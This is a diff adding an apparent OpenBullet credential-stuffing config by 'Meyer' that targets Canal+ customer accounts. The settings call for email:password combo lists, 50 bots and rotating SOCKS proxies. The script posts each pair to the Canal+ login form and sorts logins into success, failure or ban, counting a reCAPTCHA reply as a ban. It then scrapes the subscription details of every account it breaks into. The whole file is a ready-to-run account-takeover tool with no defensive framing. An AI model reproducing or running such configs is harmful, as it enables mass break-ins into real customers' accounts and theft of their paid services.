@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "MyCanal ByMeyer",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-11T16:54:58.3198372+00:00",
+  "AdditionalInfo": "CAPTURE & CONFIG BY MEYER. BAN PROXY NOT EU.",
+  "Author": "ByMeyer",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": true,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#MEYER_IS_A_GET_ REQUEST GET "https://compte-canal.canal-plus.com/ec/authentication?ssoconf=auth_ecrwd&urlSource=http%3A%2F%2Fm.espaceclientcanal.canal-plus.com&pass_target=http%3A%2F%2Fm.espaceclientcanal.canal-plus.com%2F&omnitureChannel=EC%20Mobile" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#MEYER_PARSE_THE_ERROR PARSE "<SOURCE>" CSS "[name=error]" "value" 0 -> VAR "ERROR" "" "" 
+#MEYER_PARSE_SSOMEM PARSE "<SOURCE>" CSS "[name=ssoMem]" "value" 0 -> VAR "SSOMEM" "" "" 
+#MEYERPARSE_CHECKBOX_SSOMEM PARSE "<SOURCE>" CSS "[name=__checkbox_ssoMem]" "value" 0 -> VAR "__CHECKBOX_SSOMEM" "" "" 
+#MEYER_POST_THE_LOGIN REQUEST POST "https://compte-canal.canal-plus.com/ec/authentication?ssoconf=auth_ecrwd&urlSource=http%3A%2F%2Fm.espaceclientcanal.canal-plus.com&pass_target=http%3A%2F%2Fm.espaceclientcanal.canal-plus.com%2F&omnitureChannel=EC%20Mobile#" AutoRedirect=TRUE 
+  CONTENT "ssoEmail=<USER>&ssoPass=<PASS>&error=<ERROR>&ssoMem=<SSOMEM>&__checkbox_ssoMem=<__CHECKBOX_SSOMEM>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#MEYER_CHECK_THE_ACCOUNT KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "s_pass_userdata" 
+    KEY "s.eVar11=" 
+  KEYCHAIN Failure OR 
+    KEY "'non identifie'" 
+  KEYCHAIN Ban OR 
+    KEY "\"recaptchaContainer\"" 
+#MEYER_CAPTURE_LES_ABONNEMENTS REQUEST GET "https://m.secure.espaceclientcanal.canal-plus.com/secure/3/abonne/mon-compte/abonnement/modif-abo/pid253-consulter-mon-abonnement.html" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#MEYER_FAIT_DES_CAPTURES PARSE "<SOURCE>" LR "=\"libAbo" "</span>
+         " Recursive=TRUE -> VAR "Abonnement:" "" "" 
